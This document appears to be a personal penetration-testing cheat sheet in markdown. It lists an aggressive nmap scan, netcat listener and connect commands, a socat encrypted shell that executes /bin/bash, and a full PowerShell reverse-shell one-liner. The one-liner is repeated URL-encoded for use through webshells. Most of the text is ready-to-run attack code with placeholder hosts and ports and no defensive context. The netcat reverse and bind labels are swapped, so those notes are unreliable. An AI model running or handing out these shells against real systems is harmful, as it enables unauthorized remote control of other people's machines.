# SUMMARY OF SCRIPTS AND USER CASES

## NMAP 
```
sudo nmap -sS -sV -sC -T4 --min-rate 8888 $TARGET -vv
# -sS: stealth
# -sC: scripting
# -sV: service detection
# -T4: aggresiveness
# --min-rate: packet strength 
```
## NETCAT 
```
#REVERSE SHELL 
nc -lvnp <port-number>
# -l: listen
# -v: verbose
# -n: no dns resolve
# -p: specify port
nc -lvnp 4444

#BIND SHELL
nc <target-ip> <port-number>
# This will connect to the listener
nc 10.10.10.10 4444
```

## SOCAT ENCRYPTED SHELLS
```
openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt 
cat shell.crt shell.key > shell.pem


# TO START THE ENCRYPTED LISTENER
socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 -

# TO CONNECT TO THE LISTENER
socat OPENSSL:<LOCAL-IP>:<LOCAL-PORT>,verify=0 EXEC:/bin/bash
```

## POWERSHELL
> CHANGE <ip> and <port>
One liner reverse shell 
```
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<ip>',<port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

same one liner reverse shell but url encoded for webshells
```
powershell%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient%28%27<IP>%27%2C<PORT>%29%3B%24stream%20%3D%20%24client.GetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream.Read%28%24bytes%2C%200%2C%20%24bytes.Length%29%29%20-ne%200%29%7B%3B%24data%20%3D%20%28New-Object%20-TypeName%20System.Text.ASCIIEncoding%29.GetString%28%24bytes%2C0%2C%20%24i%29%3B%24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20Out-String%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29.Path%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20%28%5Btext.encoding%5D%3A%3AASCII%29.GetBytes%28%24sendback2%29%3B%24stream.Write%28%24sendbyte%2C0%2C%24sendbyte.Length%29%3B%24stream.Flush%28%29%7D%3B%24client.Close%28%29%22
```
